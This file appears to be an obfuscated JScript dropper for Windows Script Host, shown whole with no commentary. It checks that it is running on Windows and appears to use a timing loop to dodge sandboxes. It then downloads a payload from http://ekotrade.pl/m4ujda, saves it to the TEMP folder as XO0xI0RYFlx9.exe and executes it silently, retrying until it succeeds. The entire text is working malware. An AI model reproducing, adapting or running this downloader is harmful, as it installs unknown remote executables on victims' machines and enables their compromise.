var D0 = false;
var RP = "Create"+"Object";
var F0 = function UQ() {return WScript[RP]("WScript"+".Shell");}(), YN = 11;
var CD = "MSXML2"+".XMLHTTP";
var MC = 2;
var IN = MC - 2;
function YY(HW){F0["Run"](HW, IN, IN);};
function JC(){return CD + "";};
function PI(VS, FL){IN = IN * 1; return VS - FL;};
function SX(){return RP;};
/*@cc_on
  @if (@_win32 || @_win64)
    D0 = true;
  @end
@*/
if (D0)
{
var L = "";
function Q(){return 22;};
var Q0 = 0; var N = 0;
function WK()
{
var WT = new this["Date"]();
var HA = WT["getUTCMilliseconds"]();
WScript["Sleep"](Q());
var WT = new this["Date"]();
var S = WT["getUTCMilliseconds"]();
WScript["Sleep"](Q());
var WT = new this["Date"]();
var S0 = WT["getUTCMilliseconds"]();
var Q0 = "D";
Q0 = PI(S, HA);
var N = "WK0";
N = PI(S0, S);
L = "open";
return PI(Q0, N);
}
var Z0 = false;
var F = false;
for (var Z = IN; Z < Q() * 1; Z++){if (WK() != IN){
Z0 = true; 
N = "31" + 11 * Q0 + N; 
F = true; 
break;
}}
function HU() {return ((Z0 == true) && (Z0 == F)) ? 1 : IN;};
if (Z0 && HU() && F){
function W() {return F0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "XO0xI0RYFlx9.ex" + "e";};
 A = JC();
 L0 = WScript[RP](A);
 var JU = 1;
do { 
	for (;JU;){
	try {
		if (JU == 1)
		{
			L0[L]("GET", "http://ekotrade.pl/m4ujda", false);
			L0["send"]();
			C = "Sleep";
			JU = 2;
		}
		WScript[C](Q() + 120); 
		if (L0["readystate"] < 2 * 2) continue;
		JU = IN;
		function YC(ML) {var IF = (1, 2, 3, 4, 5, ML); return IF;};
		B = WScript[SX()]("ADODB.Stream");
		A = B;
		A[L]();
		A["type"] = YC(1);
		A["write"](L0["ResponseBody"]);
		B["position"] = YC(IN);
		A["Save" + "ToFile"](W(), 2);
		B["cl"+"ose"]();
		OA = W();
		YY(OA);
	} catch(RK){};};
}while (JU);
}
}

